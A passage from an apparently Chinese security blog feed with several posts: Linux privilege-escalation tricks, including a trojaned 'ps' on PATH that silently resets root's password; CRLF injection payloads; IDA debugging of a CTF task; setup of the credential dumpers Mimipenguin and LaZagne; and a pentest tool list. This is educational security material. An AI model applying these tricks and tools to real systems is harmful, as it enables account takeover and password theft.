class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;root:password&quot;</span> |chpasswd &gt;&gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>echo <span class="hljs-string">&quot;bash: whomai: 未找到命令&quot;</span><br></code></pre></td></tr></table></figure><p>当然我们可以配置非常多的文件名来增加触发概率。</p><h3 id="3-3-su切换而不是su-切换导致携带用户环境变量"><a href="#3-3-su切换而不是su-切换导致携带用户环境变量" class="headerlink" title="3.3 su切换而不是su -切换导致携带用户环境变量"></a>3.3 su切换而不是su -切换导致携带用户环境变量</h3><p>linux系统在使用su切换时，会携带当前用户的环境变量，使用su -则不会，如果在当前用户环境变量设置如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=/home/test/ps:$PATH<br></code></pre></td></tr></table></figure><p>编辑一个ps文件</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;root:password&quot;</span> |chpasswd &gt;&gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>ps<br></code></pre></td></tr></table></figure><p>那么在从此用户切换到root的管理员，在使用ps时就会修改掉root用户密码。</p>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux,提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ida远程调试linux程序</title>
    <link href="/2020/02/04/ida%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95linux%E7%A8%8B%E5%BA%8F/"/>
    <url>/2020/02/04/ida%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95linux%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在分析二进制程序时，经常需要借助动态调试的方法，在linux中我们通常使用gdb来进行动态调试，但是gdb使用方法较复杂，对新手不友好，而ida具有很好的图形化界面，使用ida对linux程序进行远程动态调试在这种情况下是一种不错的选择。</p><h2 id="ida远程调试配置"><a href="#ida远程调试配置" class="headerlink" title="ida远程调试配置"></a>ida远程调试配置</h2><p>1.要配置ida远程调试，首先需要将ida安装目录dbgsrv中的linux_server、linux_server64（根据所调试程序是32还是64位）拷贝至linux机器中。赋予其可执行权限，并运行对应版本的linux_server。</p><p>2.将需要调试程序拷贝两份，一份放在linux中，赋予其others可执行权限（sudo chmod o+x xxx），另一份放在windows中，使用ida打开，并选择在上方菜单栏选择Debuger-&gt;Run-&gt;Remote Linux Debugger。</p><p>3.在Debugger-&gt;process options中配置远程linux机器ip，端口，运行文件路径，以及运行参数等。点击ok，ida自动载入远程程序，ida远程调试的配置就完成了。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida01.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida02.png"></p><h2 id="ida远程调试"><a href="#ida远程调试" class="headerlink" title="ida远程调试"></a>ida远程调试</h2><p>在本文中使用一道pwnable中的简单题目来讲解ida远程调试,先贴题目代码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> random;<br>        random = <span class="hljs-built_in">rand</span>();        <span class="hljs-comment">// random value!</span><br><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> key=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;key);<br><br>        <span class="hljs-keyword">if</span>( (key ^ random) == <span class="hljs-number">0xdeadbeef</span> )&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Good!\n&quot;</span>);<br>                <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题原意是考察c语言中rand()函数在不使用随机数种子的情况下，默认使用1作为种子，导致每次产生的随机数均为同样的值，只需要将代码重新编译运行print出随机数即可，或者动态调试时候直接查看内存中随机数的值，此处为了介绍ida远程调试，就使用第二种办法。</p><p>1.首先我们在刚才的程序中，找到主函数，F5反编译伪代码，F2设置断点，并启动远程调试。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida03.png"></p><p>2.打开debugger-&gt;debugger windows-&gt;watch view监视窗口，添加新变量v5进行观察，或者直接在汇编中，添加eax查看调用rand函数之后的值。</p><p>3.F8单步调试，F9单步进入函数，多次按下F8在rand()之后查看v5或rand之后eax的值，计算和0xdeadbeef的异或就是需要输入的key值。在这里得到，随机数为0x6B8B4567，则计算得到key为0xb526fb88，由于需要输入%d格式的key，所以转换成十进制为3039230856。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida04.png"></p><p>4.linux中输入计算值，进入分支，获取flag。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida05.png"></p>]]></content>
    
    
    <categories>
      
      <category>ida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CRLF攻击</title>
    <link href="/2020/01/06/CRLF%E6%94%BB%E5%87%BB/"/>
    <url>/2020/01/06/CRLF%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p>CRLF是Carriage-Return Line-Feed的缩写，意思是回车换行，就是回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)。。换行在有的ASCII码表也用newline（简nl）来进行表示,这里的lf是line feed的概念，意思是一样的。</p><h2 id="CRLF攻击"><a href="#CRLF攻击" class="headerlink" title="CRLF攻击"></a>CRLF攻击</h2><p>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</p><h2 id="CRLF攻击检测"><a href="#CRLF攻击检测" class="headerlink" title="CRLF攻击检测"></a>CRLF攻击检测</h2><p>CRLF攻击主要从黑盒角度进行检测，通过修改http参数或url，添加%0d%0a构造恶意CRLF，观察恶意数据在响应头中是否输出，如果恶意数据在响应头中出现，则说明存在CRLF注入漏洞。</p><p>如请求</p><p><a href="http://www.test.com/index.php?id=1">http://www.test.com/index.php?id=1</a></p><p>则构造恶意请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.test.com/index.php?id=<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aSet-Cookie:SessionID=hacker<br></code></pre></td></tr></table></figure><p>检查Cookie是否在响应中被改为SessionID=hacker，即可判断是否存在漏洞。</p><h2 id="CRLF攻击利用"><a href="#CRLF攻击利用" class="headerlink" title="CRLF攻击利用"></a>CRLF攻击利用</h2><p>CRLF能用来控制http请求头中的内容，所以利用的思路基本也是往这个方向考虑，下面列举几种常见的利用手段。</p><h3 id="1-会话固定"><a href="#1-会话固定" class="headerlink" title="1.会话固定"></a>1.会话固定</h3><p>会话固定攻击（session fixation attack）是利用应用系统在服务器的会话ID固定不变机制，借助他人用相同的会话ID获取认证和授权，然后利用该会话ID劫持他人的会话以成功冒充他人，造成会话固定攻击。</p><p>CRLF利用会话固定就是诱骗受害者使用攻击者指定的会话标识（SessionID），构造一个如下url即可发起攻击，诱拐受害者使用指定Cookie访问网站</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.test.com/index.php?id=<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aSet-Cookie:SessionID=hacker<br></code></pre></td></tr></table></figure><h3 id="2-控制location进行不安全跳转"><a href="#2-控制location进行不安全跳转" class="headerlink" title="2.控制location进行不安全跳转"></a>2.控制location进行不安全跳转</h3><p>网站多数会通过HTTP Header 中的location的方式来实现跳转，我们可以通过CRLF注入Location字段控制网站进行不安全跳转。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.test.com/index.php?id=<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aLocation:www.hack.com<br></code></pre></td></tr></table></figure><h3 id="3-注入xss"><a href="#3-注入xss" class="headerlink" title="3.注入xss"></a>3.注入xss</h3><p>可将xss直接注入html中触发</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">http://www.test.com/index.php<span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="4-修改浏览器xss保护策略"><a href="#4-修改浏览器xss保护策略" class="headerlink" title="4.修改浏览器xss保护策略"></a>4.修改浏览器xss保护策略</h3><p>浏览器存在一个xss的保护策略，X-XSS-Protection，默认会阻止xss触发，但是可以通过http-header关闭这个策略，再配合第三条注入xss，即可造成xss攻击</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">http://www.test.com/index.php<span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0aX-XSS-Protection</span>=<span class="hljs-number">0</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h2><p>过滤 \r 、\n 之类的行结束符，避免输入的数据影响正常http header。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>crlf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>两款密码提取工具的配置和使用</title>
    <link href="/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="linux密码提取工具Mimipenguin配置及其使用"><a href="#linux密码提取工具Mimipenguin配置及其使用" class="headerlink" title="linux密码提取工具Mimipenguin配置及其使用"></a>linux密码提取工具Mimipenguin配置及其使用</h2><h3 id="Mimipenguin"><a href="#Mimipenguin" class="headerlink" title="Mimipenguin"></a>Mimipenguin</h3><p>Mimipenguin从Linux内存中提取登录密码的工具。改编自流行的Windows工具mimikatz。</p><h3 id="安装Mimipenguin"><a href="#安装Mimipenguin" class="headerlink" title="安装Mimipenguin"></a>安装Mimipenguin</h3><p>首先从github上克隆Mimipenguin</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/huntergregal/mimi</span>penguin<br></code></pre></td></tr></table></figure><p>然后安装Mimipenguin的依赖GLIBC_2.14，而GLIBC_2.14我们需要源码编译安装，所以需要安装gcc</p><p>根据不同系统选择不同的安装命令</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> gcc<br>yum <span class="hljs-keyword">install</span> gcc<br></code></pre></td></tr></table></figure><p>完成之后，我们先创建一个路径存放下载的源码，然后下载GLIBC_2.14的源码进行编译安装并链接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/home/</span>tar<br>cd <span class="hljs-regexp">/home/</span>tar<br>wget https:<span class="hljs-regexp">//</span>ftp.gnu.org<span class="hljs-regexp">/gnu/g</span>libc/glibc-<span class="hljs-number">2.14</span>.tar.gz<br>tar -zxvf glibc-<span class="hljs-number">2.14</span>.tar.gz<br>cd glibc-<span class="hljs-number">2.14</span><br>mkdir build<br>cd build<br>..<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/g</span>libc-<span class="hljs-number">2.14</span><br>make -j8<br>make install<br>export LD_LIBRARY_PATH=LD_LIBRARY_PATH:<span class="hljs-regexp">/home/</span>tar<span class="hljs-regexp">/glibc-2.14/</span>build/<br></code></pre></td></tr></table></figure><p>然后进入mimipenguin目录，运行mimipenguin</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./mimipenguin</span><br></code></pre></td></tr></table></figure><h2 id="密码提取工具LaZagne"><a href="#密码提取工具LaZagne" class="headerlink" title="密码提取工具LaZagne"></a>密码提取工具LaZagne</h2><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p>LaZagne是一款可以在windows、linux、mac中提取密码的工具，包括各类浏览器中保存的密码，本地保存的私钥文件，windows的登陆密码，记住的wifi密码等。每个环境中的安装使用操作都比较相似，本部分以windows为例介绍一下安装运行过程。</p><h3 id="安装LaZagne"><a href="#安装LaZagne" class="headerlink" title="安装LaZagne"></a>安装LaZagne</h3><p>LaZagne需要python环境才可以运行，所以要提前准备python环境，并将pip更新到最新版本。</p><p>在windows本地任意文件夹内下载LaZagne源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AlessandroZ/</span>LaZagne.git<br></code></pre></td></tr></table></figure><p>requirements.txt中说明了运行LaZagne需要哪些依赖,requirements.txt:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">enum34; python_version &lt; <span class="hljs-string">&#x27;3.4&#x27;</span> and sys_platform == <span class="hljs-string">&#x27;win32&#x27;</span><br>psutil; sys_platform == <span class="hljs-string">&#x27;linux&#x27;</span> or sys_platform == <span class="hljs-string">&#x27;linux2&#x27;</span><br>pyasn1<br>rsa; sys_platform == <span class="hljs-string">&#x27;win32&#x27;</span><br>secretstorage; sys_platform == <span class="hljs-string">&#x27;linux&#x27;</span> or sys_platform == <span class="hljs-string">&#x27;linux2&#x27;</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AlessandroZ/</span>pypykatz<span class="hljs-regexp">/archive/m</span>aster.zip; sys_platform == <span class="hljs-string">&#x27;win32&#x27;</span>  <span class="hljs-comment"># should point to pypykatz if my PR is approved</span><br><br></code></pre></td></tr></table></figure><p>在命令行中运行</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> r requirements.txt<br></code></pre></td></tr></table></figure><p>接着进入Windows目录(如果是其他系统就使用对应目录脚本)，根据需要获取的密码范围运行laZagne.py来获取密码：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">#运行所有模块<br><span class="hljs-keyword">python</span> laZagne.<span class="hljs-keyword">py</span> <span class="hljs-keyword">all</span><br>#仅从浏览器获取密码<br><span class="hljs-keyword">python</span> laZange.<span class="hljs-keyword">py</span> browsers<br>#仅从火狐浏览器获取密码<br><span class="hljs-keyword">python</span> laZagne.<span class="hljs-keyword">py</span> browsers -firefox<br></code></pre></td></tr></table></figure><p>如果运行laZagne.py中报错缺少依赖，就根据报错信息pip安装所需依赖直到可以运行。</p><p>运行结果部分截图</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/password_get/password01.png"></p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>samba安装与配置</title>
    <link href="/2019/09/02/samba%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2019/09/02/samba%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h3 id="samba-简介"><a href="#samba-简介" class="headerlink" title="samba 简介"></a>samba 简介</h3><p>Samba，用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS（Server Message Block/Common Internet File System）网络协定做连结，在Windows与UNIX系列OS之间搭起一座桥梁，使两者可以进行资源共享。<br>常用于需要频繁访问和读写文件的情况，如在windows下使用人性化的编辑器来书写或修改代码，在linux中进行频繁的编译验证这种场景。本文就以这种场景为例介绍samba的安装和配置。</p><h3 id="samba-安装"><a href="#samba-安装" class="headerlink" title="samba 安装"></a>samba 安装</h3><p>根据自身情况选择命令安装</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> samba<br>apt-get <span class="hljs-keyword">install</span> samba<br>yum <span class="hljs-keyword">install</span> samba<br></code></pre></td></tr></table></figure><h3 id="samba-配置"><a href="#samba-配置" class="headerlink" title="samba 配置"></a>samba 配置</h3><p>进入samba配置文件目录，编辑配置文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> /etc/samba<br><span class="hljs-keyword">vi</span> smb.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>在末尾添加</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[share]</span><br>    <span class="hljs-attr">path</span> =/home/share<br>    <span class="hljs-attr">available</span> = <span class="hljs-literal">yes</span><br>    <span class="hljs-attr">browsealbe</span> = <span class="hljs-literal">yes</span><br>    <span class="hljs-attr">public</span>= <span class="hljs-literal">no</span><br>    <span class="hljs-attr">writable</span> = <span class="hljs-literal">yes</span>    <br></code></pre></td></tr></table></figure><p>然后在/home下创建share目录，并提升权限至777</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">cd /home<br>mkdir share<br>chmod -R <span class="hljs-number">777</span> share<br></code></pre></td></tr></table></figure><p>然后添加samba用户share，注意这里必须先添加一个同名的系统用户</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">useradd <span class="hljs-keyword">share</span><br>smbpasswd -a <span class="hljs-keyword">share</span><br></code></pre></td></tr></table></figure><p>设置完成密码后重启samba服务</p><p>根据不同系统，选择不同命令启动</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/samba restart<br>service smbd restart<br></code></pre></td></tr></table></figure><p>完成后，通过windows访问</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">\\linux机器的<span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure><p>输入账号密码进入共享文件夹，开始方便的资源共享。</p><p>接着就可以把需要在linux环境运行的代码，git clone到share目录下然后使用windows的编辑器编辑了。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python渗透测试工具库[转载]</title>
    <link href="/2019/08/26/python%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%BA%93-%E8%BD%AC%E8%BD%BD/"/>
    <url>/2019/08/26/python%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%BA%93-%E8%BD%AC%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞练习平台"><a href="#漏洞练习平台" class="headerlink" title="漏洞练习平台"></a>漏洞练习平台</h2><p>WebGoat漏洞练习平台：<br><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p><p>webgoat-legacy漏洞练习平台:<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>zvuldirll漏洞练习平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a></p><p>vulapps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a></p><p>dvwa漏洞练习平台：<br><a href="https://github.com/RandomStorm/DVWA">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a></p><p>Ruby编写的一款工具，生成含漏洞的虚拟机：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a></p><h2 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h2><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p><p>本地网络扫描器：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器：<br><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br><a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a></p><p>linux漏洞扫描：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a></p><p>基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a></p><p>漏洞路由扫描器：<br><a href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>服务器端口弱口令扫描器：<br><a href="https://github.com/wilson9x1/fenghuangscanner_v3">https://github.com/wilson9x1/fenghuangscanner_v3</a></p><p>Fox-scan扫描器：<br><a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p><h2 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h2><p>社工收集器：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集：<br><a href="https://github.com/sea-god/gitscan">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p><p>信息探测及扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a></p><p>内部网络信息扫描器：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a></p><p>远程桌面登录扫描器：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a></p><p>网络基础设施渗透工具<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a></p><p>SNMAP密码破解:<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>webshell大合集：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集：<br><a href="https://github.com/rootphantomer/hacktoolsfor_me">https://github.com/rootphantomer/hacktoolsfor_me</a></p><p>XSS数据接收平台：<br><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具：<br><a href="https://github.com/evilcos/xssor">https://github.com/evilcos/xssor</a></p><p>xss多功能扫描器：<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p><p>web漏洞扫描器:<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a></p><p>WEB漏洞扫描器：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p><p>渗透常用小工具包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a></p><p>web目录扫描器:<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>web向命令注入检测工具：<br><a href="https://github.com/stasinopoulos/commix">https://github.com/stasinopoulos/commix</a></p><p>自动化SQL注入检查工具：<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><p>SSL扫描器：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a></p><p>安全工具集合：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a></p><p>apache日志分析器：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a></p><p>php代码审计工具：<br><a href="https://github.com/pwnsdx/BadCode">https://github.com/pwnsdx/BadCode</a></p><p>web指纹识别扫描：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a></p><p>检查网站恶意攻击：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a></p><p>wordprees漏洞扫描器：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></p><p>固件漏洞扫描器：<br><a href="https://github.com/misterch0c/firminator_backend">https://github.com/misterch0c/firminator_backend</a></p><p>数据库注入工具<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理：<br><a 